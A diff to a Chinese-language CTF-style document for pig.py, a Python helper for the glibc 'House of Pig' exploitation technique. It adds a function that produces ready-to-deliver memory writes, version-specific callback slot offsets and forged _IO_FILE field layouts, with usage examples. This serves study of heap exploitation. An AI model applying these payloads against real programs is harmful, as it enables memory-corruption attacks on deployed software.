@@ -90,7 +90,12 @@ memset(new_buf + old_blen, 0, new_size - old_blen);
 
 ## Python 离线板子
 
-[`pig.py`](./pig.py) 提供 `build_house_of_pig`，把 `_IO_str_overflow` 的扩容数据流算成可直接用的计划对象。
+[`pig.py`](./pig.py) 提供两个函数：
+
+```text
+build_house_of_pig         -> 返回扩容计划 PigPlan
+build_house_of_pig_payload -> 返回可直接投递的 MemoryWrite 写入
+```
 
 ### 函数用途
 
@@ -123,29 +128,56 @@ memset(new_buf + old_blen, 0, new_size - old_blen);
 | `allocate_slot_addr` | 2.23～2.27 为 `stream_addr + 0xe0`；2.28+ 为 `None`。 |
 | `free_slot_addr` | 2.23～2.27 为 `stream_addr + 0xe8`；2.28+ 为 `None`。 |
 
+### 返回对象 `PigPayload`
+
+| 字段 | 含义 |
+|---|---|
+| `plan` | 上面的 `PigPlan`。 |
+| `writes` | `MemoryWrite` 元组，是真正可交给题目写原语的 payload。 |
+
+`build_house_of_pig_payload` 的 `writes`：
+
+```text
+2.23～2.27:
+    stream_addr + 0xe0 -> allocate_callback_addr
+    stream_addr + 0xe8 -> free_callback_addr
+
+2.28～2.43:
+    stream_addr 处写 0x48 字节 FILE 字段镜像：
+        _IO_read_base/_ptr/_end  = old_buffer_addr
+        _IO_write_base           = old_buffer_addr
+        _IO_write_ptr/_end       = old_buffer_addr + old_length
+        _IO_buf_base             = old_buffer_addr
+        _IO_buf_end              = old_buffer_addr + old_length
+```
+
 ### 最小使用示例
 
 ```python
-from pig import build_house_of_pig
+from pig import build_house_of_pig, build_house_of_pig_payload
 
-# 2.28+：直接 malloc/memcpy/free 数据流
-plan = build_house_of_pig(
+# 2.28+：直接 malloc/memcpy/free 数据流，并生成触发扩容分支的 FILE 字段镜像
+payload = build_house_of_pig_payload(
     version="2.35",
+    stream_addr=0x200000,
     old_buffer_addr=0x300000,   # 旧 _IO_buf_base
     old_length=0x40,            # old_blen
 )
-print(plan.new_size)            # 2 * 0x40 + 100 = 0xc4
-print(plan.allocate_slot_addr, plan.free_slot_addr)  # None, None
+print(payload.plan.new_size)     # 2 * 0x40 + 100 = 0xe4
+for w in payload.writes:
+    print(w.label, hex(w.address), w.data.hex())
 
 # 2.23～2.27：需要 stream_addr，返回旧回调槽
-plan = build_house_of_pig(
+payload = build_house_of_pig_payload(
     version="2.27",
     old_buffer_addr=0x300000,
     old_length=0x40,
     stream_addr=0x200000,       # _IO_strfile 对象
+    allocate_callback_addr=0x401000,
+    free_callback_addr=0x402000,
 )
-print(hex(plan.allocate_slot_addr), hex(plan.free_slot_addr))
-# 0x2000e0, 0x2000e8
+for w in payload.writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
 
 ### 调用者必须提供
